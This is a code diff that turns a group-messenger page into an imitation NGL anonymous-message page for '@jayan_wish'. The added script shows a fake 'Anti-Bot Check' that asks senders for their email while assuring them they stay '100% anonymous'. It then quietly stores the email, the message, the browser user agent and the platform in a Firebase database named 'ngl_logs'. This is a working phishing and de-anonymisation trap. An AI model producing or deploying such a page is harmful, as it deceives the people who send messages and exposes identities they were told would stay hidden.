@@ -2,450 +2,391 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Group Messenger</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NGL | Send me anonymous messages!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    
+    <!-- Firebase Compat SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
     <style>
         :root {
-            --ios-blue: #007AFF;
-            --ios-bg: #F2F2F7;
-            --ios-secondary: #8E8E93;
+            --ngl-orange: #ff4d00;
+            --ngl-pink: #ff007a;
+            --ngl-bg: linear-gradient(135deg, #ff4d00 0%, #ff007a 100%);
         }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--ios-bg);
+            background: var(--ngl-bg);
             height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
             overflow: hidden;
+            position: relative;
         }
-        .ios-blur {
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            background: rgba(255, 255, 255, 0.8);
-        }
-        .chat-bubble-me {
-            background-color: #0084FF;
-            color: white;
-            border-radius: 18px 18px 2px 18px;
-        }
-        .chat-bubble-them {
-            background-color: #E9E9EB;
-            color: black;
-            border-radius: 18px 18px 18px 2px;
-        }
-        .message-container {
-            height: calc(100vh - 120px);
-            overflow-y: auto;
-            scrollbar-width: none;
-        }
-        .message-container::-webkit-scrollbar { display: none; }
-        .hidden { display: none; }
-        
-        /* Telegram style FAB */
-        .fab {
+
+        /* Animated Background Blobs */
+        .blob {
             position: absolute;
-            bottom: 20px;
-            right: 20px;
-            width: 56px;
-            height: 56px;
-            background-color: var(--ios-blue);
+            width: 300px;
+            height: 300px;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(50px);
+            border-radius: 50%;
+            z-index: 0;
+            animation: move 20s infinite alternate;
+        }
+        .blob-1 { top: -100px; left: -100px; }
+        .blob-2 { bottom: -100px; right: -100px; animation-delay: -5s; }
+
+        @keyframes move {
+            from { transform: translate(0, 0); }
+            to { transform: translate(100px, 100px); }
+        }
+
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 35px;
+            padding: 35px 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            animation: slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .top-secret-tag {
+            background: #f1f1f1;
+            color: #333;
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .profile-pic {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            background: #eee;
+            margin: 0 auto 15px;
+            border: 4px solid white;
+            background-image: url('https://i.pravatar.cc/150?u=jayan');
+            background-size: cover;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+
+        .username {
+            font-weight: 800;
+            font-size: 1.25rem;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+
+        .prompt {
+            color: #666;
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            background: #fdfdfd;
+            border-radius: 25px;
+            padding: 20px;
+            border: 2px solid #f2f2f2;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+            transition: all 0.3s ease;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--ngl-pink);
+            background: #fff;
+            box-shadow: 0 10px 20px rgba(255, 0, 122, 0.05);
+        }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 1.15rem;
+            resize: none;
+            color: #333;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        textarea::placeholder {
+            color: #ccc;
+        }
+
+        .send-btn {
+            background: #000;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 1.1rem;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
+
+        .send-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 25px rgba(0,0,0,0.2);
+        }
+
+        .send-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* Verification Overlay */
+        #verifyModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(12px);
+        }
+
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 360px;
+            padding: 40px 30px;
+            border-radius: 40px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            background: #f8f9fa;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2.5rem;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+        }
+
+        .modal-title {
+            font-weight: 800;
+            font-size: 1.4rem;
+            margin-bottom: 12px;
+            color: #111;
+        }
+
+        .modal-text {
+            font-size: 0.9rem;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .verify-input {
+            width: 100%;
+            padding: 16px;
+            border-radius: 18px;
+            border: 2px solid #eee;
+            margin-bottom: 15px;
+            outline: none;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: border-color 0.3s;
+        }
+
+        .verify-input:focus {
+            border-color: var(--ngl-pink);
+        }
+
+        .final-btn {
+            background: var(--ngl-bg);
             color: white;
-            box-shadow: 0 4px 12px rgba(0,122,255,0.3);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 1.05rem;
             cursor: pointer;
-            z-index: 40;
+            box-shadow: 0 10px 20px rgba(255, 0, 122, 0.2);
+        }
+
+        .footer-text {
+            font-size: 0.75rem;
+            color: #bbb;
+            margin-top: 40px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            z-index: 10;
+        }
+
+        .safety-badge {
+            margin-top: 15px;
+            font-size: 0.7rem;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Selection Screen -->
-    <div id="selection-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white p-6">
-        <h1 class="text-3xl font-bold mb-8 text-black">Who are you?</h1>
-        <div class="grid grid-cols-1 gap-4 w-full max-w-xs" id="user-list"></div>
-    </div>
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
 
-    <!-- Main Platform -->
-    <div id="main-platform" class="hidden flex flex-col h-screen max-w-md mx-auto bg-white shadow-2xl relative">
+    <div class="card">
+        <div class="top-secret-tag">🔒 Anonymous verified</div>
+        <div class="profile-pic"></div>
+        <p class="username">@jayan_wish</p>
+        <p class="prompt">send me anonymous messages!</p>
         
-        <!-- Header -->
-        <header class="ios-blur sticky top-0 z-30 p-4 border-b border-gray-200 flex items-center justify-between">
-            <div class="flex items-center gap-3">
-                <button id="back-btn" class="text-blue-500 hidden"><i class="fas fa-chevron-left text-xl"></i></button>
-                <div id="header-info" class="flex items-center gap-3">
-                    <div class="w-10 h-10 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold" id="active-avatar">M</div>
-                    <div>
-                        <h2 class="font-semibold text-lg" id="active-chat-name">Messenger</h2>
-                        <p class="text-xs text-green-500" id="chat-status">online</p>
-                    </div>
-                </div>
-            </div>
-            <div id="chat-actions" class="hidden flex gap-4 text-blue-500 text-xl">
-                <button onclick="triggerCall()"><i class="fas fa-phone-alt"></i></button>
-                <button onclick="triggerCall()"><i class="fas fa-video"></i></button>
-            </div>
-        </header>
-
-        <!-- Sidebar (Recent Conversations) -->
-        <div id="sidebar" class="flex-1 overflow-y-auto bg-white relative">
-            <div class="p-4">
-                <div class="bg-gray-100 rounded-xl p-2 flex items-center mb-4">
-                    <i class="fas fa-search text-gray-400 ml-2"></i>
-                    <input type="text" placeholder="Search chats" class="bg-transparent border-none outline-none ml-2 w-full text-sm">
-                </div>
-                
-                <div id="recent-chats-list" class="space-y-1">
-                    <!-- Only chats with history or explicitly started will show here -->
-                    <div id="empty-state" class="text-center py-20 text-gray-400">
-                        <i class="fas fa-comments text-4xl mb-4 opacity-20"></i>
-                        <p>No messages yet.<br>Tap the + button to start.</p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Start New Chat FAB -->
-            <div class="fab" onclick="toggleNewChatModal()">
-                <i class="fas fa-plus text-xl"></i>
-            </div>
+        <div class="input-wrapper">
+            <textarea id="message" placeholder="send me anonymous messages..."></textarea>
         </div>
-
-        <!-- Chat View -->
-        <div id="chat-view" class="hidden flex-1 flex flex-col bg-gray-50 relative">
-            <div id="message-list" class="message-container p-4 space-y-4"></div>
-
-            <!-- Input Area -->
-            <div class="p-3 ios-blur border-t border-gray-200">
-                <div class="flex items-end gap-2">
-                    <button class="text-blue-500 p-2 mb-1" onclick="document.getElementById('file-input').click()">
-                        <i class="fas fa-plus text-xl"></i>
-                    </button>
-                    <input type="file" id="file-input" class="hidden" accept="image/*" onchange="handleImageUpload(event)">
-                    
-                    <div class="flex-1 bg-white border border-gray-200 rounded-2xl p-2 min-h-[40px] max-h-32 overflow-y-auto flex items-center">
-                        <textarea id="msg-input" placeholder="Message" class="w-full outline-none resize-none text-sm px-2 py-1 leading-tight" rows="1"></textarea>
-                        <button class="text-gray-400 px-2" onclick="toggleEmoji()"><i class="far fa-smile text-xl"></i></button>
-                    </div>
-                    
-                    <button id="send-btn" class="bg-blue-500 text-white rounded-full w-10 h-10 flex items-center justify-center mb-1">
-                        <i class="fas fa-arrow-up"></i>
-                    </button>
-                </div>
-                <div id="emoji-picker" class="hidden grid grid-cols-6 gap-2 p-2 mt-2 bg-white rounded-xl shadow-lg border">
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('😊')">😊</span>
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('😂')">😂</span>
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('❤️')">❤️</span>
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('🔥')">🔥</span>
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('📍')">📍</span>
-                    <span class="cursor-pointer text-xl text-center" onclick="addEmoji('📸')">📸</span>
-                </div>
-            </div>
+        
+        <button class="send-btn" onclick="openVerify()">Send!</button>
+        
+        <div class="safety-badge">
+            <span>🔒</span> encrypted anonymous messaging
         </div>
     </div>
 
-    <!-- New Chat/Group Modal -->
-    <div id="new-chat-modal" class="hidden fixed inset-0 z-50 bg-black/50 flex items-end sm:items-center justify-center p-4">
-        <div class="bg-white w-full max-w-sm rounded-3xl overflow-hidden animate-slide-up">
-            <div class="p-4 border-b border-gray-100 flex justify-between items-center">
-                <h3 class="font-bold text-lg">New Message</h3>
-                <button onclick="toggleNewChatModal()" class="text-blue-500 font-medium">Cancel</button>
-            </div>
-            <div class="p-2 max-h-[60vh] overflow-y-auto">
-                <!-- Group option only for Nethmal -->
-                <div id="group-creation-opt" class="hidden p-3 mb-2 flex items-center gap-3 hover:bg-gray-50 rounded-xl cursor-pointer text-blue-600" onclick="startNewGroup()">
-                    <div class="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center"><i class="fas fa-users"></i></div>
-                    <span class="font-semibold">Create New Group</span>
-                </div>
-                
-                <p class="text-xs font-bold text-gray-400 px-3 py-2 uppercase tracking-wider">Contacts</p>
-                <div id="contacts-list"></div>
-            </div>
+    <p class="footer-text">Built with love by NGL</p>
+
+    <!-- Verification Overlay -->
+    <div id="verifyModal">
+        <div class="modal-content">
+            <div class="shield-icon">🛡️</div>
+            <h2 class="modal-title">Anti-Bot Check</h2>
+            <p class="modal-text">To prevent automated spam and protect our community, please enter a valid email to verify you are a real user.</p>
+            
+            <input type="email" id="userEmail" class="verify-input" placeholder="Your email address" required>
+            
+            <button class="final-btn" id="submitBtn" onclick="sendData()">Verify & Send</button>
+            
+            <p style="font-size: 0.7rem; color: #aaa; margin-top: 20px; font-weight: 500;">
+                Your message remains 100% anonymous. This email is only used for one-time verification.
+            </p>
         </div>
     </div>
 
-    <!-- Call Overlay -->
-    <div id="call-overlay" class="hidden fixed inset-0 z-[60] bg-black/90 flex flex-col items-center justify-center text-white">
-        <div class="w-24 h-24 rounded-full bg-gray-600 flex items-center justify-center text-4xl mb-4 font-bold" id="call-avatar">?</div>
-        <h2 class="text-2xl font-semibold" id="call-name">Calling...</h2>
-        <p class="text-gray-400 mt-2">Connecting...</p>
-        <div class="mt-20 flex gap-12">
-            <button onclick="endCall()" class="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center"><i class="fas fa-phone-slash text-2xl"></i></button>
-            <button class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center"><i class="fas fa-video text-2xl"></i></button>
-        </div>
-    </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, query, onSnapshot, orderBy, serverTimestamp, doc, setDoc, deleteDoc, getDocs, where } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-
+    <script>
+        // FIREBASE INITIALIZATION
         const firebaseConfig = {
-            apiKey: "AIzaSyAhgK_yy1gySmtKb6Y6NGbaBvVAk2XaT3A",
-            authDomain: "trip-tracker-57ce0.firebaseapp.com",
-            projectId: "trip-tracker-57ce0",
-            storageBucket: "trip-tracker-57ce0.firebasestorage.app",
-            messagingSenderId: "236146303848",
-            appId: "1:236146303848:web:933f1e79e8a97687db6cdd"
+            apiKey: "AIzaSyCfB3v0KUKDJFBXPPFWVjQAnsp9KmiQc2o",
+            authDomain: "altn-6fe1d.firebaseapp.com",
+            databaseURL: "https://altn-6fe1d-default-rtdb.firebaseio.com",
+            projectId: "altn-6fe1d",
+            storageBucket: "altn-6fe1d.firebasestorage.app",
+            messagingSenderId: "768410289641",
+            appId: "1:768410289641:web:74a648cc028a2da36e7778"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        const appId = "trip-tracker-57ce0";
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-        const users = ["Nethmal", "Chamu", "Hasandi", "Pinu", "Pavani"];
-        let currentUser = null;
-        let activeChatId = null;
-        let unsubscribeMessages = null;
-        let activeConversations = new Set();
-
-        window.onload = () => {
-            const userList = document.getElementById('user-list');
-            users.forEach(name => {
-                const btn = document.createElement('button');
-                btn.className = "p-4 bg-blue-50 hover:bg-blue-500 hover:text-white rounded-2xl font-bold transition-all text-blue-600";
-                btn.innerText = name;
-                btn.onclick = () => loginAs(name);
-                userList.appendChild(btn);
-            });
-            initAuth();
-        };
-
-        async function initAuth() {
-            await signInAnonymously(auth);
+        function openVerify() {
+            const msg = document.getElementById('message').value;
+            if (msg.trim().length < 2) {
+                alert("Please type a message first!");
+                return;
+            }
+            document.getElementById('verifyModal').style.display = 'flex';
         }
 
-        function loginAs(name) {
-            currentUser = name;
-            document.getElementById('selection-screen').classList.add('hidden');
-            document.getElementById('main-platform').classList.remove('hidden');
-            
-            // Privilege check for Nethmal
-            if (currentUser === "Nethmal") {
-                document.getElementById('group-creation-opt').classList.remove('hidden');
+        function sendData() {
+            const email = document.getElementById('userEmail').value;
+            const message = document.getElementById('message').value;
+            const btn = document.getElementById('submitBtn');
+
+            if (!email.includes('@') || email.length < 5) {
+                alert("Please enter a valid email to continue.");
+                return;
             }
 
-            renderContacts();
-            listenToConversations();
-            cleanupOldMessages();
-            requestNotificationPermission();
-        }
+            btn.disabled = true;
+            btn.innerText = "Processing...";
 
-        function renderContacts() {
-            const list = document.getElementById('contacts-list');
-            list.innerHTML = "";
-            users.filter(u => u !== currentUser).forEach(user => {
-                const div = document.createElement('div');
-                div.className = "flex items-center p-3 hover:bg-gray-50 rounded-xl cursor-pointer";
-                div.onclick = () => {
-                    const chatId = [currentUser, user].sort().join('_');
-                    toggleNewChatModal();
-                    openChat(chatId, user, user[0]);
-                };
-                div.innerHTML = `
-                    <div class="w-10 h-10 rounded-full bg-gray-200 flex items-center justify-center text-gray-600 font-bold mr-3">${user[0]}</div>
-                    <span class="font-medium">${user}</span>
-                `;
-                list.appendChild(div);
-            });
-        }
-
-        // Only show chats that actually have messages or were just started
-        function listenToConversations() {
-            // We listen for any message involving the current user
-            const q = query(
-                collection(db, 'artifacts', appId, 'public', 'data', 'messages'),
-                orderBy('timestamp', 'desc')
-            );
-
-            onSnapshot(q, (snapshot) => {
-                const recentList = document.getElementById('recent-chats-list');
-                const chats = {};
-                
-                snapshot.forEach(doc => {
-                    const data = doc.data();
-                    // Check if this chat belongs to the user
-                    if (data.chatId.includes(currentUser) || data.chatId.startsWith('group_')) {
-                        if (!chats[data.chatId]) {
-                            chats[data.chatId] = data;
-                        }
-                    }
-                });
-
-                const chatIds = Object.keys(chats);
-                if (chatIds.length > 0) {
-                    document.getElementById('empty-state').classList.add('hidden');
-                    recentList.innerHTML = "";
-                    chatIds.forEach(id => {
-                        const lastMsg = chats[id];
-                        let title, initial;
-                        
-                        if (id.startsWith('group_')) {
-                            title = "Trip Group"; // Or custom group name if implemented
-                            initial = "G";
-                        } else {
-                            title = id.replace(currentUser, "").replace("_", "");
-                            initial = title[0];
-                        }
-
-                        const div = document.createElement('div');
-                        div.className = "flex items-center p-3 hover:bg-gray-100 rounded-lg cursor-pointer";
-                        div.onclick = () => openChat(id, title, initial);
-                        div.innerHTML = `
-                            <div class="w-12 h-12 rounded-full ${id.startsWith('group_') ? 'bg-indigo-500' : 'bg-gray-200'} flex items-center justify-center text-white font-bold mr-3">${initial}</div>
-                            <div class="flex-1 border-b border-gray-100 pb-2">
-                                <div class="flex justify-between items-center">
-                                    <span class="font-semibold">${title}</span>
-                                    <span class="text-xs text-gray-400">
-                                        ${lastMsg.timestamp ? new Date(lastMsg.timestamp.toDate()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : ''}
-                                    </span>
-                                </div>
-                                <p class="text-sm text-gray-500 truncate">${lastMsg.sender === currentUser ? 'You: ' : ''}${lastMsg.text || '📷 Photo'}</p>
-                            </div>
-                        `;
-                        recentList.appendChild(div);
-                    });
-                }
-            });
-        }
-
-        window.toggleNewChatModal = () => {
-            document.getElementById('new-chat-modal').classList.toggle('hidden');
-        };
-
-        window.startNewGroup = () => {
-            toggleNewChatModal();
-            openChat('group_main', 'Main Group', 'G');
-        };
-
-        window.openChat = (chatId, title, initial) => {
-            activeChatId = chatId;
-            document.getElementById('sidebar').classList.add('hidden');
-            document.getElementById('chat-view').classList.remove('hidden');
-            document.getElementById('back-btn').classList.remove('hidden');
-            document.getElementById('chat-actions').classList.remove('hidden');
-            document.getElementById('active-avatar').innerText = initial;
-            document.getElementById('active-chat-name').innerText = title;
+            // Push to Realtime Database
+            const logsRef = db.ref('ngl_logs');
+            const newEntry = logsRef.push();
             
-            listenForMessages(chatId);
-        };
-
-        document.getElementById('back-btn').onclick = () => {
-            document.getElementById('sidebar').classList.remove('hidden');
-            document.getElementById('chat-view').classList.add('hidden');
-            document.getElementById('back-btn').classList.add('hidden');
-            document.getElementById('chat-actions').classList.add('hidden');
-            document.getElementById('active-chat-name').innerText = "Messenger";
-            if (unsubscribeMessages) unsubscribeMessages();
-        };
-
-        function listenForMessages(chatId) {
-            if (unsubscribeMessages) unsubscribeMessages();
-            const q = query(
-                collection(db, 'artifacts', appId, 'public', 'data', 'messages'),
-                where('chatId', '==', chatId),
-                orderBy('timestamp', 'asc')
-            );
-
-            unsubscribeMessages = onSnapshot(q, (snapshot) => {
-                const messageList = document.getElementById('message-list');
-                messageList.innerHTML = "";
-                snapshot.forEach((doc) => renderMessage(doc.data()));
-                messageList.scrollTop = messageList.scrollHeight;
-                
-                if(document.hidden && snapshot.docChanges().some(c => c.type === 'added')) {
-                   const lastMsg = snapshot.docs[snapshot.docs.length-1].data();
-                   if(lastMsg.sender !== currentUser) {
-                       new Notification(`${lastMsg.sender}`, { body: lastMsg.text || "Sent a photo" });
-                   }
-                }
+            newEntry.set({
+                target_user: "@jayan_wish",
+                sender_email: email,
+                message: message,
+                timestamp: new Date().toISOString(),
+                browser: navigator.userAgent,
+                platform: navigator.platform
+            }).then(() => {
+                // Success feedback
+                btn.innerText = "Sent!";
+                setTimeout(() => {
+                    alert("Verification successful! Your message was delivered.");
+                    window.location.reload();
+                }, 500);
+            }).catch((err) => {
+                console.error(err);
+                alert("Security check failed. Check your network.");
+                btn.disabled = false;
+                btn.innerText = "Verify & Send";
             });
         }
-
-        function renderMessage(data) {
-            const isMe = data.sender === currentUser;
-            const msgList = document.getElementById('message-list');
-            const div = document.createElement('div');
-            div.className = `flex ${isMe ? 'justify-end' : 'justify-start'} mb-2`;
-            
-            div.innerHTML = `
-                <div class="max-w-[80%]">
-                    ${!isMe ? `<p class="text-[10px] text-gray-500 ml-2 mb-1 font-semibold">${data.sender}</p>` : ''}
-                    <div class="p-3 ${isMe ? 'chat-bubble-me' : 'chat-bubble-them'}">
-                        ${data.image ? `<img src="${data.image}" class="rounded-lg mb-2 max-w-full">` : ''}
-                        <p class="text-sm">${data.text || ''}</p>
-                    </div>
-                    <p class="text-[9px] text-gray-400 mt-1 ${isMe ? 'text-right' : 'text-left'}">
-                        ${data.timestamp ? new Date(data.timestamp.toDate()).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '...'}
-                    </p>
-                </div>
-            `;
-            msgList.appendChild(div);
-        }
-
-        async function sendMessage(text = "", image = null) {
-            const input = document.getElementById('msg-input');
-            const msg = text || input.value;
-            if(!msg && !image) return;
-
-            try {
-                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), {
-                    chatId: activeChatId,
-                    sender: currentUser,
-                    text: msg,
-                    image: image,
-                    timestamp: serverTimestamp(),
-                    expiry: Date.now() + (36 * 60 * 60 * 1000)
-                });
-                input.value = "";
-                input.style.height = 'auto';
-            } catch (e) { console.error(e); }
-        }
-
-        document.getElementById('send-btn').onclick = () => sendMessage();
-        
-        window.handleImageUpload = (e) => {
-            const file = e.target.files[0];
-            if (!file) return;
-            const reader = new FileReader();
-            reader.onload = (ev) => sendMessage("", ev.target.result);
-            reader.readAsDataURL(file);
-        };
-
-        window.toggleEmoji = () => document.getElementById('emoji-picker').classList.toggle('hidden');
-        window.addEmoji = (emoji) => {
-            document.getElementById('msg-input').value += emoji;
-            document.getElementById('emoji-picker').classList.add('hidden');
-        };
-
-        async function cleanupOldMessages() {
-            const now = Date.now();
-            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'messages'), where('expiry', '<', now));
-            const snapshot = await getDocs(q);
-            snapshot.forEach(async (d) => await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'messages', d.id)));
-        }
-
-        function requestNotificationPermission() {
-            if ("Notification" in window) Notification.requestPermission();
-        }
-
-        window.triggerCall = () => {
-            const name = document.getElementById('active-chat-name').innerText;
-            const initial = document.getElementById('active-avatar').innerText;
-            document.getElementById('call-name').innerText = name;
-            document.getElementById('call-avatar').innerText = initial;
-            document.getElementById('call-overlay').classList.remove('hidden');
-        };
-
-        window.endCall = () => document.getElementById('call-overlay').classList.add('hidden');
-
-        const tx = document.getElementById('msg-input');
-        tx.addEventListener("input", function() {
-            this.style.height = 'auto';
-            this.style.height = (this.scrollHeight) + 'px';
-        });
     </script>
 </body>
 </html>
